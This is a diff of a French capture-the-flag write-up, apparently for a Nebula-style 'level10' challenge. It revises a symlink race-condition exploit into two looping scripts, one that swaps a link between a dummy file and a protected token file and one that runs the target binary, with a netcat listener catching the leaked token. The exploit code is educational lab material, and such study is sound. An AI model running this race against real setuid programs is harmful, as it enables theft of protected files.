@@ -29,21 +29,18 @@ La vulnérabilité clé est l'intervalle de temps entre la vérification des per
 touch /tmp/myfile
 chmod 777 /tmp/myfile
 
-nano /tmp/run.sh
+nano /tmp/switcher.sh
 ```
 
-Contenu de `/tmp/run.sh`:
+Contenu de `/tmp/switcher.sh`:
 ```bash
 #!/bin/bash
 
 while true; do
-  # Basculer le lien symbolique vers /tmp/myfile (accessible)
+  # Basculer le lien symbolique vers /tmp/myfile
   ln -sf /tmp/myfile /tmp/linkfile
 
-  # Exécuter le programme level10 (qui vérifiera l'accès à /tmp/linkfile pointant vers myfile)
-  /home/user/level10/level10 /tmp/linkfile 127.0.0.1
-
-  # Basculer rapidement le lien symbolique vers le fichier token (inaccessible)
+  # Basculer le lien symbolique vers le fichier token
   ln -sf /home/user/level10/token /tmp/linkfile
 done
 ```
@@ -52,21 +49,39 @@ done
 - `-s` : Crée un lien symbolique (symlink) au lieu d'un lien physique. Un lien symbolique est comme un raccourci qui pointe vers un autre fichier. Ils sont utiles ici car ils peuvent être rapidement redirigés pour pointer vers différents fichiers.
 - `-f` : Option "force". Si le fichier cible existe déjà, le supprime avant de créer le lien. Cela évite les messages d'erreur concernant les fichiers déjà existants.
 
-Rendre le script exécutable :
 ```bash
-chmod +x /tmp/run.sh
+nano /tmp/runner.sh
+```
+
+Contenu de `/tmp/runner.sh`:
+```bash
+#!/bin/bash
+
+while true; do
+  # Exécuter le programme level10
+  /home/user/level10/level10 /tmp/linkfile 127.0.0.1
+done
+```
+
+Rendre les scripts exécutables :
+```bash
+chmod +x /tmp/switcher.sh
+chmod +x /tmp/runner.sh
 ```
 
 ### Étape 2 : Mettre en place un écouteur et exécuter les scripts
 
-Dans deux terminaux séparés, exécutez :
+Dans trois terminaux séparés, exécutez :
 
 ```bash
 # Terminal 1 : Démarrer un écouteur netcat
 nc -kl 6969
 
-# Terminal 2 : Exécuter le script d'exploitation en boucle
-/tmp/run.sh
+# Terminal 2 : Exécuter le programme en boucle
+/tmp/runner.sh
+
+# Terminal 3 : Basculer les liens en boucle
+/tmp/switcher.sh
 ```
 
 - `nc` est l'utilitaire netcat, un outil réseau polyvalent.
